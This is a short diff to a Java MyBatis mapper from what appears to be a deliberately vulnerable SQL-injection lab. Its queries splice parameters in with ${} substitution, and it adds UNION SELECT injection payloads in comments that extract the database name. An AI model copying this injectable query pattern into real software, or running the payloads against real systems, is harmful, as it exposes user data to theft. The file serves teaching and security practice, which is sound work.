@@ -10,7 +10,7 @@ import java.util.List;
 @Mapper
 public interface sqlDao {
 //    数字型
-//    payload:1' 1"
+//    payload:1' 1"    -1 union select 1,database(),3,4--
     @Select("select * from user where username=${username} and password=${password}")
     public User sql0(@Param("username") String username, @Param("password") String password);
 //    '闭合
@@ -26,7 +26,7 @@ public interface sqlDao {
     public List<User> sql2(@Param("search") String search);
 
 //    ('闭合
-//    payload:1') --
+//    payload:1') --    -1') union select 1,database(),3,4 -- s
     @Select("select * from user where username=('${username}') and password=('${password}')")
     public User sql3(@Param("username") String username, @Param("password") String password);
 
